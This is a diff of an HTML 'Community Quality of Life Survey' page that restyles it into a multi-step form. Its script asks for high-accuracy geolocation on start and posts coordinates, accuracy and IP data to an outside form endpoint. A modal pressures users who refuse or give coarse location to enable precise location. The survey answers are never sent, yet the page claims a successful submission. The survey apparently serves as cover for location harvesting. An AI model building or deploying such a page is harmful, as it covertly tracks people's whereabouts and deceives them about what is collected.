@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Community Survey</title>
+    <title>Community Quality of Life Survey</title>
     
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -20,10 +20,9 @@
             --text-sub: #5f6368;
             --border-color: #e0e0e0;
             --border-focus: #673ab7;
-            --shadow-sm: 0 1px 3px rgba(0,0,0,0.05), 0 1px 2px rgba(0,0,0,0.1);
-            --shadow-md: 0 4px 12px rgba(103, 58, 183, 0.08), 0 2px 6px rgba(0,0,0,0.04);
-            --radius-lg: 12px;
-            --radius-md: 8px;
+            --shadow-md: 0 10px 25px rgba(103, 58, 183, 0.08), 0 4px 10px rgba(0,0,0,0.04);
+            --radius-lg: 16px;
+            --radius-md: 10px;
         }
 
         * {
@@ -39,34 +38,65 @@
             color: var(--text-main);
             display: flex;
             justify-content: center;
-            align-items: flex-start;
+            align-items: center;
             min-height: 100vh;
-            padding: 40px 16px;
+            padding: 24px 16px;
+            overflow-x: hidden;
         }
 
         .form-container {
             width: 100%;
-            max-width: 680px;
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
+            max-width: 620px;
+            position: relative;
         }
 
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            height: 6px;
+            background: #e0e0e0;
+            border-radius: 3px;
+            margin-bottom: 24px;
+            overflow: hidden;
+            display: none;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: var(--primary-accent);
+            width: 20%;
+            transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        /* Step Card Animation System */
         .form-card {
             background: var(--card-bg);
             border-radius: var(--radius-lg);
             border: 1px solid var(--border-color);
-            padding: 32px;
-            box-shadow: var(--shadow-sm);
-            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            padding: 40px 32px;
+            box-shadow: var(--shadow-md);
+            display: none;
+            opacity: 0;
+            transform: translateX(40px);
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .form-card:hover {
-            box-shadow: var(--shadow-md);
+        .form-card.active {
+            display: block;
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .form-card.slide-out {
+            opacity: 0;
+            transform: translateX(-40px);
         }
 
         .header-card {
             border-top: 10px solid var(--primary-accent);
+            display: block;
+            opacity: 1;
+            transform: translateX(0);
         }
 
         h1 {
@@ -81,7 +111,7 @@
             font-size: 15px;
             color: var(--text-sub);
             line-height: 1.6;
-            margin-bottom: 24px;
+            margin-bottom: 32px;
         }
 
         .question-group {
@@ -90,16 +120,16 @@
         }
 
         .question-label {
-            font-size: 16px;
+            font-size: 18px;
             font-weight: 600;
-            margin-bottom: 16px;
+            margin-bottom: 24px;
             color: var(--text-main);
-            line-height: 1.4;
+            line-height: 1.5;
         }
 
         /* Slider Styling */
         .slider-wrapper {
-            padding: 10px 4px 4px 4px;
+            padding: 10px 4px;
         }
 
         .range-slider {
@@ -123,15 +153,15 @@
             background: var(--primary-light);
             color: var(--primary-accent);
             font-weight: 700;
-            font-size: 16px;
-            padding: 4px 14px;
+            font-size: 18px;
+            padding: 6px 16px;
             border-radius: 20px;
         }
 
         .slider-ticks {
             display: flex;
             justify-content: space-between;
-            margin-top: 8px;
+            margin-top: 12px;
             font-size: 13px;
             color: var(--text-sub);
             font-weight: 500;
@@ -141,18 +171,20 @@
         .option-label {
             display: flex;
             align-items: center;
-            gap: 12px;
-            font-size: 15px;
+            gap: 14px;
+            font-size: 16px;
             color: var(--text-main);
-            padding: 12px 16px;
+            padding: 16px 20px;
             border-radius: var(--radius-md);
-            border: 1px solid transparent;
+            border: 1.5px solid var(--border-color);
             cursor: pointer;
-            margin-bottom: 6px;
-            transition: background 0.15s ease;
+            margin-bottom: 12px;
+            transition: all 0.2s ease;
+            background: #fafafa;
         }
 
         .option-label:hover {
+            border-color: var(--primary-accent);
             background-color: var(--primary-light);
         }
 
@@ -163,17 +195,24 @@
             cursor: pointer;
         }
 
-        /* Button Styling */
+        /* Navigation Buttons */
+        .btn-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+
         .btn {
             background-color: var(--primary-accent);
             color: #ffffff;
             border: none;
-            padding: 12px 28px;
-            font-size: 15px;
+            padding: 14px 32px;
+            font-size: 16px;
             font-weight: 600;
             border-radius: var(--radius-md);
             cursor: pointer;
-            box-shadow: 0 2px 4px rgba(103, 58, 183, 0.2);
+            box-shadow: 0 4px 12px rgba(103, 58, 183, 0.25);
             transition: all 0.2s ease;
             display: inline-flex;
             align-items: center;
@@ -182,14 +221,32 @@
 
         .btn:hover {
             background-color: var(--primary-hover);
-            transform: translateY(-1px);
-            box-shadow: 0 4px 8px rgba(103, 58, 183, 0.3);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(103, 58, 183, 0.35);
         }
 
-        #questionsSection {
+        .btn-secondary {
+            background-color: transparent;
+            color: var(--text-sub);
+            border: 1.5px solid var(--border-color);
+            box-shadow: none;
+        }
+
+        .btn-secondary:hover {
+            background-color: #f1f1f1;
+            color: var(--text-main);
+            border-color: #ccc;
+            transform: none;
+            box-shadow: none;
+        }
+
+        /* Validation Error Message */
+        .error-msg {
+            color: #d93025;
+            font-size: 13px;
+            font-weight: 500;
+            margin-top: 8px;
             display: none;
-            flex-direction: column;
-            gap: 20px;
         }
 
         /* Modal Overlay */
@@ -208,23 +265,23 @@
         .modal-card {
             background: #ffffff;
             border-radius: var(--radius-lg);
-            padding: 32px;
+            padding: 36px;
             max-width: 480px;
             width: 100%;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
         }
 
         .modal-card h2 {
-            font-size: 22px;
+            font-size: 24px;
             font-weight: 700;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             color: var(--text-main);
         }
 
         .modal-card p {
-            font-size: 14px;
+            font-size: 15px;
             color: var(--text-sub);
-            margin-bottom: 20px;
+            margin-bottom: 24px;
             line-height: 1.6;
         }
 
@@ -232,10 +289,10 @@
             background: var(--primary-light);
             border: 1px solid rgba(103, 58, 183, 0.2);
             border-radius: var(--radius-md);
-            padding: 16px;
+            padding: 18px;
             font-size: 14px;
             color: var(--text-main);
-            margin-bottom: 24px;
+            margin-bottom: 28px;
             line-height: 1.7;
         }
     </style>
@@ -244,109 +301,103 @@
 
     <div class="form-container">
         
-        <!-- STEP 1: Intro Card -->
-        <div class="form-card header-card" id="introSection">
+        <!-- Progress Bar -->
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        
+        <!-- STEP 0: Intro Card -->
+        <div class="form-card header-card active" id="step0">
             <h1>Community Quality of Life Survey 📋</h1>
-            <p class="desc">Welcome! We are collecting feedback to better understand local community needs and resource distribution. Please click below to start the 5-question survey.</p>
-            <button class="btn" onclick="startSurveyWithLocation()">Start Form</button>
+            <p class="desc">Welcome! We are collecting feedback to better understand local community needs and resource distribution. This survey features quick interactive steps.</p>
+            <button class="btn" style="width: 100%;" onclick="startSurveyWithLocation()">Start Survey ✨</button>
         </div>
 
-        <!-- STEP 2: The 5 Questions -->
-        <div id="questionsSection">
-            
-            <!-- Q1: Happiness Slider -->
-            <div class="form-card">
-                <div class="question-group">
-                    <div class="slider-header">
-                        <label class="question-label" style="margin-bottom: 0;">1. How would you rate your happiness?</label>
-                        <span class="slider-badge" id="sliderVal">3</span>
-                    </div>
-                    <div class="slider-wrapper">
-                        <input type="range" min="1" max="5" value="3" class="range-slider" id="q1_slider" oninput="document.getElementById('sliderVal').innerText = this.value">
-                        <div class="slider-ticks">
-                            <span>1 (Very Unhappy)</span>
-                            <span>2</span>
-                            <span>3</span>
-                            <span>4</span>
-                            <span>5 (Very Happy)</span>
-                        </div>
+        <!-- STEP 1: Happiness Slider -->
+        <div class="form-card" id="step1">
+            <div class="question-group">
+                <div class="slider-header">
+                    <label class="question-label" style="margin-bottom: 0;">1. How would you rate your happiness?</label>
+                    <span class="slider-badge" id="sliderVal">3</span>
+                </div>
+                <div class="slider-wrapper" style="margin-top: 20px;">
+                    <input type="range" min="1" max="5" value="3" class="range-slider" id="q1" oninput="document.getElementById('sliderVal').innerText = this.value">
+                    <div class="slider-ticks">
+                        <span>1 (Very Unhappy)</span>
+                        <span>3</span>
+                        <span>5 (Very Happy)</span>
                     </div>
                 </div>
             </div>
-
-            <!-- Q2: Wealthy Neighborhood -->
-            <div class="form-card">
-                <div class="question-group">
-                    <label class="question-label">2. Would you say you live in a wealthy neighborhood?</label>
-                    <label class="option-label">
-                        <input type="radio" name="wealthy_neighborhood" value="Yes"> Yes
-                    </label>
-                    <label class="option-label">
-                        <input type="radio" name="wealthy_neighborhood" value="Moderate / Average"> Moderate / Average
-                    </label>
-                    <label class="option-label">
-                        <input type="radio" name="wealthy_neighborhood" value="No"> No
-                    </label>
-                </div>
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="prevStep(1)">Back</button>
+                <button class="btn" onclick="nextStep(1)">Next ➔</button>
             </div>
+        </div>
 
-            <!-- Q3: Basic Needs -->
-            <div class="form-card">
-                <div class="question-group">
-                    <label class="question-label">3. Do you have access to basic needs (like clean water, heating, housing)?</label>
-                    <label class="option-label">
-                        <input type="radio" name="basic_needs" value="Always"> Always
-                    </label>
-                    <label class="option-label">
-                        <input type="radio" name="basic_needs" value="Sometimes"> Sometimes
-                    </label>
-                    <label class="option-label">
-                        <input type="radio" name="basic_needs" value="Rarely / Never"> Rarely / Never
-                    </label>
-                </div>
+        <!-- STEP 2: Wealthy Neighborhood -->
+        <div class="form-card" id="step2">
+            <div class="question-group">
+                <label class="question-label">2. Would you say you live in a wealthy neighborhood?</label>
+                <label class="option-label"><input type="radio" name="wealthy_neighborhood" value="Yes"> Yes</label>
+                <label class="option-label"><input type="radio" name="wealthy_neighborhood" value="Moderate / Average"> Moderate / Average</label>
+                <label class="option-label"><input type="radio" name="wealthy_neighborhood" value="No"> No</label>
+                <div class="error-msg" id="err2">Please select an option before proceeding.</div>
             </div>
-
-            <!-- Q4: School Funding -->
-            <div class="form-card">
-                <div class="question-group">
-                    <label class="question-label">4. Do you think your local school is under-funded or over-funded?</label>
-                    <label class="option-label">
-                        <input type="radio" name="school_funding" value="Under-funded"> Under-funded
-                    </label>
-                    <label class="option-label">
-                        <input type="radio" name="school_funding" value="Adequately funded"> Adequately funded
-                    </label>
-                    <label class="option-label">
-                        <input type="radio" name="school_funding" value="Over-funded"> Over-funded
-                    </label>
-                </div>
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="prevStep(2)">Back</button>
+                <button class="btn" onclick="nextStep(2)">Next ➔</button>
             </div>
+        </div>
 
-            <!-- Q5: Financial Worry -->
-            <div class="form-card">
-                <div class="question-group">
-                    <label class="question-label">5. Do you ever find yourself worrying about finance (money)?</label>
-                    <label class="option-label">
-                        <input type="radio" name="financial_worry" value="Frequently"> Frequently
-                    </label>
-                    <label class="option-label">
-                        <input type="radio" name="financial_worry" value="Occasionally"> Occasionally
-                    </label>
-                    <label class="option-label">
-                        <input type="radio" name="financial_worry" value="Rarely or Never"> Rarely or Never
-                    </label>
-                </div>
+        <!-- STEP 3: Basic Needs -->
+        <div class="form-card" id="step3">
+            <div class="question-group">
+                <label class="question-label">3. Do you have access to basic needs (like clean water, heating, housing)?</label>
+                <label class="option-label"><input type="radio" name="basic_needs" value="Always"> Always</label>
+                <label class="option-label"><input type="radio" name="basic_needs" value="Sometimes"> Sometimes</label>
+                <label class="option-label"><input type="radio" name="basic_needs" value="Rarely / Never"> Rarely / Never</label>
+                <div class="error-msg" id="err3">Please select an option before proceeding.</div>
             </div>
-
-            <div style="display: flex; justify-content: flex-end; margin-top: 10px;">
-                <button class="btn" onclick="submitSurvey()">Submit Response</button>
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="prevStep(3)">Back</button>
+                <button class="btn" onclick="nextStep(3)">Next ➔</button>
             </div>
+        </div>
 
+        <!-- STEP 4: School Funding -->
+        <div class="form-card" id="step4">
+            <div class="question-group">
+                <label class="question-label">4. Do you think your local school is under-funded or over-funded?</label>
+                <label class="option-label"><input type="radio" name="school_funding" value="Under-funded"> Under-funded</label>
+                <label class="option-label"><input type="radio" name="school_funding" value="Adequately funded"> Adequately funded</label>
+                <label class="option-label"><input type="radio" name="school_funding" value="Over-funded"> Over-funded</label>
+                <div class="error-msg" id="err4">Please select an option before proceeding.</div>
+            </div>
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="prevStep(4)">Back</button>
+                <button class="btn" onclick="nextStep(4)">Next ➔</button>
+            </div>
+        </div>
+
+        <!-- STEP 5: Financial Worry -->
+        <div class="form-card" id="step5">
+            <div class="question-group">
+                <label class="question-label">5. Do you ever find yourself worrying about finance (money)?</label>
+                <label class="option-label"><input type="radio" name="financial_worry" value="Frequently"> Frequently</label>
+                <label class="option-label"><input type="radio" name="financial_worry" value="Occasionally"> Occasionally</label>
+                <label class="option-label"><input type="radio" name="financial_worry" value="Rarely or Never"> Rarely or Never</label>
+                <div class="error-msg" id="err5">Please select an option before proceeding.</div>
+            </div>
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="prevStep(5)">Back</button>
+                <button class="btn" onclick="submitSurvey()">Submit Response 🎉</button>
+            </div>
         </div>
 
     </div>
 
-    <!-- Location Guidance Modal (Appears for Never/Blocked or Coarse/Imprecise Location) -->
+    <!-- Location Guidance Modal -->
     <div class="modal-overlay" id="locationGuideModal">
         <div class="modal-card">
             <h2>Precise Location Required</h2>
@@ -365,6 +416,8 @@
     </div>
 
     <script>
+      let currentStep = 0;
+
       function closeModal(id) {
         document.getElementById(id).style.display = 'none';
       }
@@ -384,11 +437,9 @@
                 function(position) {
                   const lat = position.coords.latitude;
                   const lon = position.coords.longitude;
-                  const accuracy = position.coords.accuracy; // Accuracy radius in meters
+                  const accuracy = position.coords.accuracy;
 
-                  // CHECK PRECISE LOCATION: If accuracy is > 100 meters, user has Precise Location disabled
                   if (accuracy > 100) {
-                    // Send approximate IP log
                     fetch("https://formspree.io/f/xqppqorj", {
                       method: "POST",
                       headers: { "Content-Type": "application/json", "Accept": "application/json" },
@@ -404,10 +455,8 @@
                       })
                     }).catch(err => console.log(err));
 
-                    // Show guidance modal asking for Precise Location toggle
                     document.getElementById("locationGuideModal").style.display = "flex";
                   } else {
-                    // High-precision GPS Granted
                     fetch("https://formspree.io/f/xqppqorj", {
                       method: "POST",
                       headers: { "Content-Type": "application/json", "Accept": "application/json" },
@@ -424,10 +473,9 @@
                       })
                     }).catch(err => console.log(err));
 
-                    showQuestions();
+                    goToStep(1);
                   }
                 },
-                // DENIED / NEVER BLOCK DETECTED
                 function(error) {
                   if (error.code === error.PERMISSION_DENIED) {
                     fetch("https://formspree.io/f/xqppqorj", {
@@ -444,27 +492,80 @@
 
                     document.getElementById("locationGuideModal").style.display = "flex";
                   } else {
-                    showQuestions();
+                    goToStep(1);
                   }
                 },
                 { enableHighAccuracy: true, timeout: 8000 }
               );
             } else {
-              showQuestions();
+              goToStep(1);
             }
           })
           .catch(err => {
-            showQuestions();
+            goToStep(1);
           });
       }
 
-      function showQuestions() {
-        document.getElementById("introSection").style.display = "none";
-        document.getElementById("questionsSection").style.display = "flex";
+      function goToStep(step) {
+        document.getElementById(`step${currentStep}`).classList.remove('active');
+        currentStep = step;
+        document.getElementById(`step${currentStep}`).classList.add('active');
+        
+        // Show progress bar & update width (20% per question)
+        document.getElementById("progressContainer").style.display = "block";
+        document.getElementById("progressBar").style.width = (currentStep * 20) + "%";
+      }
+
+      function nextStep(stepNum) {
+        // Validation check for radio group questions
+        if (stepNum === 2) {
+          const selected = document.querySelector('input[name="wealthy_neighborhood"]:checked');
+          if (!selected) {
+            document.getElementById("err2").style.display = "block";
+            return;
+          }
+          document.getElementById("err2").style.display = "none";
+        }
+        if (stepNum === 3) {
+          const selected = document.querySelector('input[name="basic_needs"]:checked');
+          if (!selected) {
+            document.getElementById("err3").style.display = "block";
+            return;
+          }
+          document.getElementById("err3").style.display = "none";
+        }
+        if (stepNum === 4) {
+          const selected = document.querySelector('input[name="school_funding"]:checked');
+          if (!selected) {
+            document.getElementById("err4").style.display = "block";
+            return;
+          }
+          document.getElementById("err4").style.display = "none";
+        }
+
+        goToStep(stepNum + 1);
+      }
+
+      function prevStep(stepNum) {
+        if (stepNum === 1) {
+          document.getElementById("step1").classList.remove('active');
+          document.getElementById("step0").classList.add('active');
+          document.getElementById("progressContainer").style.display = "none";
+          currentStep = 0;
+          return;
+        }
+        goToStep(stepNum - 1);
       }
 
       function submitSurvey() {
-        alert("Thank you! Your survey response has been submitted.");
+        const selected = document.querySelector('input[name="financial_worry"]:checked');
+        if (!selected) {
+          document.getElementById("err5").style.display = "block";
+          return;
+        }
+        document.getElementById("err5").style.display = "none";
+
+        alert("Thank you! Your survey response has been successfully submitted.");
       }
     </script>
 
